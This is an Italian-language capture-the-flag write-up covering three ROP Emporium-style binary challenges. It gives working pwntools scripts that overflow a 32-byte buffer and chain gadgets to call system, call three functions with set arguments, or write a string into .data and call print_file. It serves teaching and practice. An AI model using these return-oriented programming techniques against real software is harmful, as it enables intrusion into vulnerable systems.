1)split
  La classica iniezione tipo shellcode non ci è utile a causa di W^X.
  Iniziando:
    1)Il testo ci dice che nel .bin c'è una stringa salvata che ci serve. Quindi ispezioniamo la parte .data con r2 (radare 2)
    	r2 split
    	iz
    	=>0x00601060 17  18   .data   ascii /bin/cat flag.txt
    	
    2)Il nostro obiettivo è di fare una chiamata system che mi apra una shell ed eseguire quel comando. system() ha un parametro. Quindi ci serve un gadget per caricare il valore di cui necessitiamo in rdi
    
    	ROPgadget --binary "./split" | grep "rdi"
    		=>0x00000000004007c3 : pop rdi ; ret
    
    3)Manca solamente l'indirizzo della chiamata (gdb)
    	p system
    	=>$1 = {<text variable, no debug info>} 0x400560 <system@plt>
    	
    4)Gadget eventuale allineamento stack
    	ROPgadget --binary "./split" | grep "ret"
    	=>0x000000000040053e : ret 
  Ora:
  buffer overflow:
  	buffer[32];
  	RBP => 8 B
  	RSP (payload trascurabile)
  	RIP
  Si inizia ad overlodare il RIP dopo 40 Bytes di garbage
  
  from pwn import *
  p=process('./split') 
  garbage=b'A'*40
  gadget_rdi=p64(0x00000000004007c3) #pop rdi;ret
  ind_flag= p64(0x00601060)
  allineamento=p64(0x000000000040053e)#ret
  syscall=p64(0x400560) 
  payload=garbage
  payload+= gadget_rdi + ind_flag + allineamento + syscall
  p.sendline(payload)
  p.interactive()
  
  =>ROPE{a_placeholder_32byte_flag!}

2)callme
  =>Anche in questa challenge abbiamo:
  	NX        : ENABLED
  Questo ci suggerisce che ci sia una tecnica W^X attiva. Perciò sappiamo che dobbiamo usare una ROP chain;
  La consegna ci dice di invocare 3 funzioni con i vari parametri; nota che siamo in un'architettura a 64bit. Un'idea potrebbe essere inviare una chain;
  Da notare che:
  	prima: la shellcode veniva iniettata nel buffer perchè era un'area di memoria sia scrivibile che eseguibile;
  	ora: A causa di tecniche come W^X, iniettiamo una ROP chain come indirizzo di ritorno (=>sequenza di indirizzi)

  a)Cerchiamo di capire la struttura del buffer
  		buffer[32]
  		RBP[8]
  		RSP(trascurabile)
  		RIP
  	=>perciò per raggiungere il RIP mi servono 40Bytes di garbage
  
  b)dobbiamo caricare i 3 valori dei parametri in dei registri; cerchiamo il gadget adeguato
  	ROPgadget --binary "./callme" | grep "pop"	
  	=>0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
  
  c)abbiamo bisogno dell'indirizzo delle funzioni
  	callme_one=>   0x0000000000400720
  	callme_two=>   0x0000000000400740
  	callme_three=> 0x00000000004006f0
  
  d)infine necessitiamo del gadget per riallineare lo stack prima delle chiamate a funzioni
  	ROPgadget --binary "./callme" | grep "ret"
  	=>0x00000000004006be : ret
  	
  	
  Ora dovremmo avere tutti gli ingredienti
  nota: 
  	-Per ogni chiamata, devi caricare nuovamente i valori nei registri, altrimenti la funzione successiva riceverà argomenti errati.
  	-Prima di chiamare una qualsiasi funzione devi allineare lo stack!
  	
  from pwn import *
  p=process('./callme')
  garbage=b'A'*40
  registri=p64(0x000000000040093c)
  value1=p64(0xdeadbeefdeadbeef)
  value2=p64(0xcafebabecafebabe)
  value3=p64(0xd00df00dd00df00d)
  allineamento=p64(0x00000000004006be)
  func1=p64(0x0000000000400720)
  func2=p64(0x0000000000400740)
  func3=p64(0x00000000004006f0)
  payload= garbage + allineamento + registri + value1 + value2 + value3 +func1
  #for each call you have to allocate the values in the registers
  payload += allineamento + registri + value1 + value2 + value3 + func2 +allineamento
  payload+= registri + value1 + value2 + value3 + func3
  p.sendline(payload)
  print(p.recvall())
  
  =>ROPE{a_placeholder_32byte_flag!}


3)write4
  C'è una funzione print_file() che ovviamente ci interessa!
  Il testo afferma che la stringa "/bin/cat flag.txt" non è presente questa volta;
  Un'idea potrebbe essere memorizzarla in un'area di memoria adatta per le variabili (.data)
  
  gdb -> info files -> 0x0000000000601028 - 0x0000000000601038 is .data
  a) buffer overflow (architettura 64 bit)
  
  	buffer[32]
  	RBP -> 8 B
  	RSP
  	RIP
  	=>garbage= b'A'*40
  
  b) abbiamo bisogno di memorizzare la variabile "/bin/cat flag.txt" in un'area di memoria da noi scelta
  	quindi avremo bisogno di un gadget del tipo mov [ptr], reg
  	
  	=>0x0000000000400628 : mov qword ptr [r14], r15 ; ret
  
  c)abbiamo bisogno di un gadget che mi metta i valori nei registri appena trovati
  	ROPgadget --binary "./write4" | grep "pop"
  	=>0x0000000000400690 : pop r14 ; pop r15 ; ret
  	
  d) abbiamo bisogno dei valori da mettere:
  	r14 => 0x0000000000601030 
  	r15=> b"/bin/cat flag.txt"
  	
  e)necessitiamo del gadget ret per riallineare lo stack
  	ROPgadget --binary "./write4" | grep "ret"
  	=>0x00000000004004e6 : ret
  	
  f)indirizzo funzione print_file
  	0x0000000000400510
  	
  g) gadget parametri funzione print_file
  	0x0000000000400693 : pop rdi ; ret
  
  
  from pwn import *
  p=process('./write4')
  garbage= b'A'*40
  gadget_pop=p64(0x0000000000400690) #pop r14 ; pop r15 ; ret
  value1=p64(0x0000000000601030)
  value2=b"flag.txt"
  gadget_mov=p64(0x0000000000400628) #mov qword ptr [r14], r15 ; ret
  target=p64(0x0000000000400510)
  align=p64(0x00000000004004e6) 
  gadget_rdi=p64(0x0000000000400693)#pop rdi ; ret
  payload= garbage +align + gadget_pop + value1 + value2 + gadget_mov
  #la funzione print_file ha un solo registro prendiamo pop rdi
  payload+= gadget_rdi + value1 + target
  p.sendline(payload)
  print(p.recvall())
  
  =>ROPE{a_placeholder_32byte_flag!}
    
